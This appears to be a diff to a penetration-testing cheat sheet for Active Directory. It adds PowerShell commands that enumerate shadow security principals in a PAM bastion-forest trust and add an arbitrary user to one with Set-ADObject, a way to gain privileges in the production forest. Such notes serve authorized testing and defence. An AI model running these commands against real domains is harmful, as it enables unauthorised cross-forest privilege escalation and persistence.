@@ -2157,8 +2157,7 @@ Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined 
 #### Check which users are members of the shadow principals
 - Run on the DC
 ```
-Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) 
-Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) | select Name,member,msDS-ShadowPrincipalSid | fl
+Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
 ```
 
 ### Check if current domain is managed by bastion forest
@@ -2172,10 +2171,20 @@ Get-ADTrust -Filter {(ForestTransitive -eq $True)}
 - To abuse the PAM trust we must compromise users or groups who are part of the shadow security principals
 
 ### Enumerate shadow principals
-- ```Name``` = name of the shadow principals, ```member``` = members of the bastion forest which are mapped to the shadow principals, ```msDS-ShadowPrincipalSid``` = SID of the principal (user or group) in the user/production forest whose privileges are assigned to the shadow security principal.
+- ```Name``` = name of the shadow principals
+- ```member``` = members of the bastion forest which are mapped to the shadow principals (if empty add user to it)
+- ```msDS-ShadowPrincipalSid``` = SID of the principal (user or group) in the user/production forest whose privileges are assigned to the shadow security principal.
 ```
-Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) 
-Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) | select Name,member,msDS-ShadowPrincipalSid | fl
+Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
+```
+ 
+#### Add member to shadow principal group
+```
+Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | Select-Object name, DistinguishedName
+Get-AdUser <USER> | Select-Object samaccountname, DistinguishedName
+Set-ADObject -Identity "<DistinguishedName SHADOW>" -Add @{'member'="<DistinguishedName USER>"}
+
+Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
 ```
 
 #### Pssession to the other forest machine
